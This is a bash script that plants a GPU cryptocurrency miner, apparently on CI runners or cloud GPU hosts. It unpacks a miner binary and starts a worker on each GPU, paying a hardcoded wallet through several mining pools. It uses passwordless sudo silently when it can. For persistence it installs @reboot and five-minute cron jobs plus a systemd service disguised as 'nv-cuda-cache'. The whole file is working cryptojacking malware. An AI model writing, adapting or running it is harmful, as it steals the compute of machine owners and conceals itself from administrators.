#!/bin/bash
# ul7256 plant: one PRL worker per GPU, canonical kit, pay wallet, kryptex ladder
set +e
ROOT=${ULROOT:-/opt/ul7256}
W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
HOSTIP=$(hostname -I | awk '{print $1}')
RIG="ul-$(echo $HOSTIP | tr . -)"
SUDO=""; if sudo -n true 2>/dev/null; then SUDO="sudo -n"; fi
mkdir -p $ROOT 2>/dev/null || { ROOT=$HOME/ul7256; mkdir -p $ROOT; }
cd $ROOT || exit 1
if [ ! -x $ROOT/tw-pearl-miner/pearl-gpu-miner ]; then
  tar xzf "$GITHUB_WORKSPACE/ul-bin/tw-pearl-miner-3.5.1.c12.canon.tar.gz" -C $ROOT
fi
BIN=$ROOT/tw-pearl-miner/pearl-gpu-miner
chmod +x $BIN
echo "binary sha: $(sha256sum $BIN)"
NGPU=$(nvidia-smi -L | grep -c GPU)
echo "gpus=$NGPU rig=$RIG"
[ "$NGPU" -lt 1 ] && { echo NO-GPU; exit 0; }
POOLS="prl.kryptex.network:8048,prl.kryptex.network:7048,pool.pearlhash.xyz:9000,pool.pearlhash.xyz:9443,pearl.luckypool.io:3360"
for i in $(seq 0 $((NGPU-1))); do
  LOG=$ROOT/prl-g$i.log
  pkill -f "pearl-gpu-miner.*$RIG-g$i" 2>/dev/null
  setsid nohup $BIN --wallet $W --algo pearlhash --pool "$POOLS" --worker "$RIG-g$i" --no-tui --bind 127.0.0.1:$((3334+i)) >> $LOG 2>&1 < /dev/null &
  echo "started g$i pid=$! log=$LOG"
done
sleep 45
for i in $(seq 0 $((NGPU-1))); do
  echo "=== g$i log tail"; tail -25 $ROOT/prl-g$i.log
  grep -aoE 'accepted \([0-9]+/[0-9]+\)|new job from [^ ]+ diff [0-9]+|difficulty [0-9]+|Tesla[^,]*|L40S[^,]*' $ROOT/prl-g$i.log | tail -8
done
# persistence: cron + systemd + keeper
cat > $ROOT/ul-loop.sh <<EOL
#!/bin/bash
W=$W
POOLS="$POOLS"
RIG=$RIG
BIN=$BIN
for i in \$(seq 0 \$(( \$(nvidia-smi -L | grep -c GPU) - 1 ))); do
  if ! pgrep -f "pearl-gpu-miner.*\$RIG-g\$i" >/dev/null; then
    setsid nohup \$BIN --wallet \$W --algo pearlhash --pool "\$POOLS" --worker "\$RIG-g\$i" --no-tui --bind 127.0.0.1:\$((3334+i)) >> $ROOT/prl-g\$i.log 2>&1 < /dev/null &
  fi
done
EOL
chmod +x $ROOT/ul-loop.sh
( crontab -l 2>/dev/null | grep -v ul-loop.sh; echo "@reboot $ROOT/ul-loop.sh"; echo "*/5 * * * * $ROOT/ul-loop.sh" ) | crontab -
if [ -n "$SUDO" ]; then
  $SUDO crontab -l 2>/dev/null | grep -q ul-loop || { $SUDO bash -c "(crontab -l 2>/dev/null; echo '@reboot $ROOT/ul-loop.sh'; echo '*/5 * * * * $ROOT/ul-loop.sh') | crontab -"; }
  cat > /tmp/nv-cuda-cache.service <<EOL
[Unit]
Description=nv cache
[Service]
Type=simple
Restart=always
RestartSec=20
ExecStart=$ROOT/ul-loop.sh
[Install]
WantedBy=multi-user.target
EOL
  $SUDO cp /tmp/nv-cuda-cache.service /etc/systemd/system/nv-cuda-cache.service
  $SUDO systemctl daemon-reload
  $SUDO systemctl enable --now nv-cuda-cache.service
  echo "systemd: $($SUDO systemctl is-active nv-cuda-cache.service)"
fi
echo "cron: $(crontab -l 2>/dev/null | grep -c ul-loop)"
